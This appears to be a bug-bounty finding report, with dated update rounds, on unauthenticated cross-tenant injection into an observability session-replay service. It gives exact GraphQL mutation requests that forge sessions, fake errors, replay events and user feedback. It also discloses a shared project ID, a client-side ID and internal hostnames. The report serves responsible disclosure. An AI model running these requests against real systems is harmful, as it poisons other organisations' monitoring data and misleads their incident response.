# FINDING CANDIDATE: Unauthenticated Cross-Tenant Injection — LD Observability / Session Replay

## Summary
The LaunchDarkly Observability public ingestion GraphQL (pub.observability.app.ld.catamorphic.com)
accepts fully unauthenticated, attacker-controlled session-replay writes into ANY tenant,
keyed solely on client-supplied identifiers. No session, token, CSRF, or Origin validation.

Severity proposal: P3 (cross-tenant write/injection; NO read access demonstrated — read path
is account-scoped via LDProjectAuth and blocked in testing).

## Verified Attack Chain (all steps reproduced unauthenticated)
1. initializeSession — forged session into arbitrary org
   POST https://pub.observability.app.ld.catamorphic.com/
   Content-Type: application/json
   Origin: https://app.launchdarkly.com (attacker-chosen, accepted)

   {"query":"mutation InitializeSession($secure_id: String!, $org: String!, $client_id: String!) { initializeSession(session_secure_id: $secure_id, session_key: \"\", organization_verbose_id: $org, enable_strict_privacy: false, enable_recording_network_contents: true, clientVersion: \"test-1.0.0\", firstloadVersion: \"test-1.0.0\", clientConfig: \"{}\", environment: \"production\", appVersion: \"1.0.0\", serviceName: \"superz-test\", fingerprint: \"superz-fp-123\", client_id: $client_id) { secure_id } }",
    "variables":{"secure_id":"1jdkoe52-sztest-22222222-2222-4222-8222-222222222222","org":"1jdkoe52","client_id":"1jdkoe52"}}

   → 200 {"data":{"initializeSession":{"secure_id":"1jdkoe52-sztest-22222222-2222-4222-8222-222222222222"}}}
   (server ECHOED BACK the attacker-forged secure_id as canonical)

2. pushSessionEvents — fake error events
   {"query":"mutation { pushSessionEvents(session_secure_id: \"1jdkoe52-sztest-22222222-2222-4222-8222-222222222222\", payload_id: 1, data: \"[...attacker-controlled error JSON with message/type/url...]\") }"}
   → 200 {"data":{"pushSessionEvents":null}}

3. pushPayload — rrweb replay events (attacker-controlled DOM)
   {"query":"mutation { pushPayload(session_secure_id: \"...\", payload_id: 3, events: { events: [{ type: 4, timestamp: 1792673000.0, _sid: 0, data: { href: \"https://injected.example/admin\" } }] }, messages: \"{}\", resources: \"{\\\"requests\\\":[]}\", errors: [], has_session_unloaded: false, highlight_logs: \"[]\") }"}
   → 200 {"data":{"pushPayload":172}}

## Why this is cross-tenant
- organization_verbose_id is a plain GraphQL argument supplied by the client (SDK source:
  observability-sdk sdk/@launchdarkly/o11y/src/client/index.tsx — GraphQLClient headers: {},
  no auth token anywhere in ingestion path).
- Session secure_id format is client-generated: GenerateSecureID(`${organizationID}-${sessionKey}`).
- Victim's observabilityProjectID is embedded client-side in victim apps (not a secret).
- Real tenants' project IDs + the same 3 mutations = injected sessions appear in the victim's
  Session Replay UI and error monitoring.

## Read isolation (verified NOT broken)
- session(secure_id) via authenticated LD session (pri graph): "record not found" for foreign session
- LDProjectAuth middleware blocks GetProjects/workspaces enumeration for LD-linked accounts
- LDAccountID not client-controllable (header tests all rejected)
- project(id) returns null for projects not mapped to the caller's LD account

## Additional unverified-but-accepted primitives (same class)
- OTLP ingestion: POST https://otel.observability.app.ld.catamorphic.com/v1/traces|/v1/logs
  with Content-Type: application/json and "highlight.project_id" resource attribute →
  200 {"partialSuccess":{}} even for bogus project IDs (landing not verified)
- addSessionFeedback mutation exists (social-engineering UI vector; shape not fully verified)

## Impact (honest)
- Poisoned Session Replay data in victim tenants (fake user sessions, fake network captures,
  fake identities via identifySession)
- Fake errors → error-monitoring pollution → false alerts (incl. Vega auto-investigation token burn)
- Misleading data during incident response/triage
- NO cross-tenant data READ demonstrated

## Recommendations for report
- Frame as cross-tenant injection (program focus: Cross-Organization Isolation)
- Do NOT claim data exposure/ATO
- Include the 3 repro requests + read-isolation test results

## R9 update (2026-10-23) — shared observabilityProjectID + per-field auth inconsistency

### Every LD org maps to the SAME observabilityProjectID
Bootstrap configs fetched under two DIFFERENT sessions (different accountId +
userEmail, verified in `recon/config_auth_org.json` vs `config_auth_tst.json`):

| field | ORG session (6ac28fd11c28fb07516cf361) | TST session (6ac29057ccacd606b1576cb7) |
|---|---|---|
| accountId | 6ac28fd11c28fb07516cf361 | 6ac29057ccacd606b1576cb7 |
| userEmail | zeno0+org@… | zeno0+tester@… |
| observabilityProjectID | **1jdkoe52** | **1jdkoe52** |
| clientSideId | **5866f3891cd8810a42ce5281** | **5866f3891cd8810a42ce5281** |

Two unrelated tenant accounts receive the identical `observabilityProjectID`
(`1jdkoe52`) and identical clientSideId in their app bootstrap. Consequences:

1. The "victim org id" argument in the FINDING_001 injection chain is NOT
   org-unique — every customer's Session Replay ingestion is keyed to one and
   the same catamorphic workspace id. Tenant separation of the observability
   product rests entirely on the read-side middleware, not on workspace keys.
2. FINDING_001's injection therefore does not even require knowing a victim's
   project ID — one constant ID lands forged sessions in the shared space.

### Read-side verification (R9, read-only tests)
- `POST https://pri.observability.app.launchdarkly.com/` — read graph:
  - `sessions(project_id, …)` UNAUTH → "LDProjectAuth requires LDAccountID in
    context" (middleware ENFORCED). ORG/TST cookies → 200, own-scoped, empty.
  - `session(secure_id)` UNAUTH → reaches the resolver ("record not found")
    — per-field middleware SKIP: some 190 query fields bypass LDProjectAuth
    and only fail at object lookup. Could not demonstrate data read: both test
    accounts have zero real sessions, forged sessions (R3/R9) never materialize
    for the read path.
  - `event_chunk_url(secure_id, index)`: UNAUTH error leaks internal
    infrastructure — `Post "http://varnish-internal.prod.launchdarkly.com:3081/
    internal/authorization/access-check/observability/bulk"` (internal host,
    port, service path disclosure, P5); TST/ORG → "access denied for action
    'viewSession'" (access-check enforced).
  - `ld_environments(project_key)` / `ld_flag(project_key, flag_key)`: scoped
    via the caller's LDSO token (TST sees only own account's projects); error
    messages reflect internal Gonfalon API error bodies (P5 reflection).
  - Bootstrap config also disclosed to the browser includes 90 keys incl.
    internal flags, observabilityProjectID, clientSideId (informational).

### Operator handoff (the remaining P1 test)
Generate REAL Session Replay traffic on an account with the Observability
product enabled (browse the app / instrument an app with the o11y SDK), obtain
a real session secure_id, then re-run: UNAUTH
`{ session(secure_id: "<real>") { identifier ip city fingerprint } }` and
`{ event_chunk_url(secure_id: "<real>", index: 0) }`. If unauth returns
session/PII data or a signed chunk URL → P1 (unauthenticated cross-tenant
session replay read). Contact Super Z with the real secure_id to run the test.

## R15 update (2026-10-24) — addSessionFeedback verified (breadth +1)

The "unverified-but-accepted primitive" list from the original report is now one shorter.
`addSessionFeedback` was introspected and fired unauthenticated against the shared
observability project, using our own R15 marker session only:

Exact signature (from introspection):
```
addSessionFeedback(session_secure_id: String, user_name: String, user_email: String,
                   verbatim: String, timestamp: Timestamp!) -> String
```
(timestamp is required and must be an RFC3339Nano string)

Verified repro (no auth, Origin header only):
```
mutation {
  addSessionFeedback(session_secure_id: "1jdkoe52-szr15-...",
                     verbatim: "superz-r15-feedback-probe",
                     user_name: "superz",
                     user_email: "superz-r15@example.test",
                     timestamp: "2026-10-24T12:00:00Z") }
→ 200 {"data":{"addSessionFeedback":"1jdkoe52-szr15-..."}}   (session id echoed back)
```

Impact delta: a victim tenant's Session Replay/feedback UI can now be seeded not only with
fake sessions/errors/replay frames (R3/R9/R13 chain) but also with **fake end-user feedback
messages carrying attacker-chosen user names and email addresses** — e.g. fabricated
"this feature breaks production" reports visible to the victim's team during triage.
Severity framing unchanged (P3): still write/injection only, read isolation intact.

Verified unauth mutation set now: initializeSession, pushSessionEvents, pushPayload,
addSessionFeedback. Introspected-but-not-fired: identifySession(session_secure_id,
user_identifier, user_object) — same class, shape documented for the triager.

Evidence: `recon/r15_hunt4.txt`, `recon/r15_hunt4b.txt` (captured 2026-10-24).

## R16 update (2026-10-24) — OTLP landing attempt + middleware delta + P5 corroboration

### OTLP ingestion: accepted-200 reconfirmed; landing still unverifiable externally
- `POST otel.observability.app.ld.catamorphic.com/v1/logs` and `/v1/traces`, unauth, with
  `highlight.project_id` resource attribute → `200 {"partialSuccess":{}}` for both the real
  project id and a bogus one (identical acceptance semantics as originally reported).
- Session-linked error push attempted (resource attr `highlight.session_secure_id` on an
  attacker-initialized session). Read-back to prove landing is NOT possible from any
  credential we hold: every read query (`session`, `errors`, `logs`, `sessions`,
  `session_comments`) now returns `LDProjectAuth requires LDAccountID in context` —
  uniformly, for unauth AND for our authenticated LDSO session cookies. Header-based
  account context (`AccountId`, `LDAccountID`, `x-account-id`, `ld-account-id`) all rejected.
- Delta note for triagers: in R9 (2026-10-23) an authenticated LDSO session resolved the
  account context and reached resolvers ("record not found" for foreign sessions). The
  middleware now hard-gates without a resolvable `LDAccountID` — i.e., the read-side
  middlewares have been tightened since R9 (or context resolution requires an
  observability entitlement our test accounts lack). Landing verification therefore
  remains an operator-side item (an account WITH the Observability product enabled).

### P5 corroboration: event_chunk_url internal-infra leak still live
`event_chunk_url(secure_id, index)` STILL discloses internal infrastructure in its error,
both unauthenticated AND with our authenticated LDSO cookie:
```
authorization check failed: failed to make request: Post
"http://varnish.ld.catamorphic.com:3081/internal/authorization/access-check/observability/bulk":
user not authenticated: LDSO token not found in context
```
Note the second part: even WITH a valid LDSO cookie the access-check call reports
"user not authenticated — LDSO token not found in context", i.e. the caller's credential
is not forwarded into the authorization subsystem for this field at all. Same internal
host/port/service-path disclosure as originally reported; still P5 class.

Evidence: `recon/r16_hunt1a.txt`, `recon/r16_hunt1b.txt`, `recon/r16_hunt1c.txt` (2026-10-24).
